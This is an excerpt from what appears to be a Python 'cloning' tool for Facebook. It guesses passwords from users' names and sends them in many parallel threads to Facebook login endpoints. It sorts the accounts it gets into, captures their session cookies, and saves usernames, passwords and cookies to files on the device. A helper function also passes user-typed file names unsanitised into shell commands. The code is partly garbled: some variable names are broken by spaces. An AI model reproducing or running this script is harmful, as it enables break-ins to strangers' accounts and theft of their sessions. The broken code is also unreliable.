...
from concurrent.futures import ThreadPoolExecutor as sarfrazSOBUJ 
from string import * 
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :     SOBUJ AHMAD 
\033[1;37m Facebook:     SOBUJ  TDH Spamming help Counter 
\033[1;37m Github  :     SOBUJ -TDH
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back SOBUJ  Menu ")
        exit()
...
def sarfraz():   
    ...
    if select =='1':
       ...
       #cutter()
    #elif select =='W':
        #os.system('xdg-open https://chat.whatsapp.com/01751494799')
        #pass
    #elif select =='F':
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SOBUJ ] {loop} | M•1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SOBUJ b = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SOBUJ b};{ckkk}"
                    print(f'\r\033[10;92m\033[1;91m[\033[1;92mSOBUJ -OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mUSER\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[🍪]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                    oks.append(sid)
                    open('/sdcard/SOBUJ .txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SOBUJ _iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [SOBUJ -CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SOBUJ .txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SOBUJ ] {loop} | M•3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SOBUJ b = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SOBUJ b};{ckkk}"
                    print(f"\r{R} [SOBUJ -OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SOBUJ .txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SOBUJ _iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [SOBUJ -CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SOBUJ ] {loop} | M•2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SOBUJ ] {loop} | M•4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazSOBUJ (max_workers=30) as SOBUJ world:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SOBUJ world.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SOBUJ world.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SOBUJ world.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SOBUJ world.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/SOBUJ .txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/SOBUJ .txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    SOBUJ  = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+SOBUJ +' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + SOBUJ  )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back SOBUJ  Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/SOBUJ .txt\n') 
        filepath = input("Put File Name: ")
